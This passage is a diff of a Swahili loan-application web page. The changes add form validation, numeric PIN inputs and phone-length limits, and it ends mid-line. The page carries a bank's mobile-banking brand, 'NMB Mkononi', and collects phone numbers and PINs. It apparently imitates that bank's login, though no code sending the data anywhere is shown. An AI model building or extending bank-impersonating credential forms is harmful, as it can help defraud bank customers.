@@ -80,7 +80,6 @@
             position: relative;
         }
 
-        /* Surface notification banner */
         #notification-banner {
             position: fixed;
             top: 20px;
@@ -349,7 +348,6 @@
 </head>
 <body>
 
-    <!-- Surface Notification Banner -->
     <div id="notification-banner"></div>
 
     <header>
@@ -391,8 +389,7 @@
                 </div>
             </div>
 
-            <!-- FIXED: Correctly routes to page-step1 -->
-            <button class="btn-primary" onclick="showPage('page-step1')">OMBA SASA</button>
+            <button class="btn-primary" onclick="proceedFromSlider()">OMBA SASA</button>
 
             <div class="features-grid">
                 <div class="feature-item">
@@ -440,9 +437,9 @@
             <div class="form-group">
                 <label>Muda wa Mkopo</label>
                 <select id="input-term">
-                    <option>Miezi 12</option>
-                    <option>Miezi 24</option>
-                    <option>Miezi 48</option>
+                    <option value="12">Miezi 12</option>
+                    <option value="24">Miezi 24</option>
+                    <option value="48">Miezi 48</option>
                 </select>
             </div>
 
@@ -451,7 +448,7 @@
                 <textarea id="loan-purpose" rows="3" placeholder="Elezea madhumuni ya mkopo wako..."></textarea>
             </div>
 
-            <button class="btn-primary" onclick="showPage('page-step2')">HATUA INAYOFUATA</button>
+            <button class="btn-primary" onclick="validateStep1()">HATUA INAYOFUATA</button>
         </div>
 
         <!-- UKURASA WA 3: HATUA YA 2 YA MAOMBI -->
@@ -479,13 +476,13 @@
                 <label>Nambari ya Simu</label>
                 <div class="phone-input-group">
                     <div class="country-code">🇹🇿 +255</div>
-                    <input type="text" id="phone-number" placeholder="712345678">
+                    <input type="text" id="phone-number" placeholder="712345678" maxlength="9">
                 </div>
             </div>
 
             <div class="btn-container">
                 <button class="btn-secondary" onclick="showPage('page-step1')">ILIYOTANGULIA</button>
-                <button class="btn-primary" onclick="prepareStep3(); showPage('page-step3');">HATUA INAYOFUATA</button>
+                <button class="btn-primary" onclick="validateStep2()">HATUA INAYOFUATA</button>
             </div>
         </div>
 
@@ -539,25 +536,25 @@
                 <label>Nambari ya Simu</label>
                 <div class="phone-input-group">
                     <div class="country-code">🇹🇿 +255</div>
-                    <input type="text" placeholder="712345678">
+                    <input type="text" id="login-phone" placeholder="712345678" maxlength="9">
                 </div>
             </div>
 
             <div class="form-group">
                 <label>Weka PIN yako (tarakimu 4)</label>
                 <div class="pin-container">
-                    <input type="password" maxlength="1" class="pin-box">
-                    <input type="password" maxlength="1" class="pin-box">
-                    <input type="password" maxlength="1" class="pin-box">
-                    <input type="password" maxlength="1" class="pin-box">
+                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+                    <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
                 </div>
             </div>
 
             <div style="text-align: right; margin-bottom: 15px;">
-                <a href="#" style="font-size: 0.8rem; color: var(--primary-color); text-decoration: none;">Umesahau PIN?</a>
+                <a href="#" style="font-size: 0.8rem; color: var(--primary-color); text-decoration: none;" onclick="showSurfaceNotification('Maelekezo yametumwa kwenye namba yako ya simu.')">Umesahau PIN?</a>
             </div>
 
-            <button class="btn-primary" onclick="showSurfaceNotification('Umeingia kwenye akaunti yako ya NMB Mkononi mafanikio!')">INGIA</button>
+            <button class="btn-primary" onclick="validateLogin()">INGIA</button>
         </div>
 
     </div>
@@ -584,8 +581,11 @@
 
         function showPage(pageId) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            document.getElementById(pageId).classList.add('active');
-            window.scrollTo(0, 0);
+            const targetPage = document.getElementById(pageId);
+            if (targetPage) {
+                targetPage.classList.add('active');
+                window.scrollTo(0, 0);
+            }
         }
 
         function updateCalc() {
@@ -599,5 +599,4 @@
             const monthlyRate = 0.25 / 12;
             const months = Number(term);
             
-            let monthlyPayment = (principal * monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, months) - 1);
-            if(isNaN(monthlyPayment) || !isFinite(monthlyPayment)) monthlyPayment =
+            let monthlyPayment = (principal * monthlyRate * Math.pow(1 + monthlyRate, months)) / (Math.pow(1 + monthlyRate, mo
